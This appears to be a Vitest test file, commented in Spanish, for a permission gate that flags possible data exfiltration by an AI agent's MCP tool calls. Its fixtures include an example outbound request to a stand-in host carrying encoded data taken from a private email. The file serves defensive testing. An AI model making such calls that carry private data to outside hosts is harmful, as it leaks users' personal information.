import { describe, expect, it } from 'vitest';
import { egressUrlOf } from '../src/egress-taint.js';
import { Gate } from '../src/permissions.js';

const MAIL = { tool: 'mail', args: { action: 'read', id: '1' }, actor: 'me' };
const BODY = 'Te espero en la Calle del Pez 14, portal 3B, a las 19:30.';
// Datos cifrados: no repiten un trozo del correo (la regla de eco no los ve), pero la
// URL lleva datos.
const DATA_URL = 'https://otro.example/x?d=7f3a9c21e0b4d8';

describe('puerta de exfiltración: URL anidada en argumentos MCP', () => {
  it('encuentra url/uri dentro de un objeto o una lista', () => {
    expect(egressUrlOf('mcp_api_call', { request: { url: DATA_URL } })).toBe(DATA_URL);
    expect(egressUrlOf('mcp_api_call', { calls: [{ endpoint: DATA_URL }] })).toBe(DATA_URL);
    expect(egressUrlOf('mcp_api_call', { a: { b: { uri: DATA_URL } } })).toBe(DATA_URL);
    expect(egressUrlOf('mcp_api_call', { request: { body: DATA_URL } })).toBeNull();
    expect(egressUrlOf('mcp_api_call', { request: { uri: 'notes://1' } })).toBeNull();
  });

  it('una MCP permitida con la URL anidada tras leer el correo pregunta', async () => {
    const asked: string[] = [];
    const g = new Gate({
      protectedPaths: [],
      allow: ['mail', 'mcp_api_call'],
      egressTaint: true,
      approver: (_c, reason) => {
        asked.push(reason);
        return true;
      },
    });
    await g.check('s', MAIL);
    g.settle('s', MAIL, false, BODY);
    await g.check('s', {
      tool: 'mcp_api_call',
      args: { request: { method: 'GET', url: DATA_URL } },
      actor: 'me',
    });
    expect(asked).toHaveLength(1);
    expect(asked[0]).toMatch(/contenido privado/);
  });
});
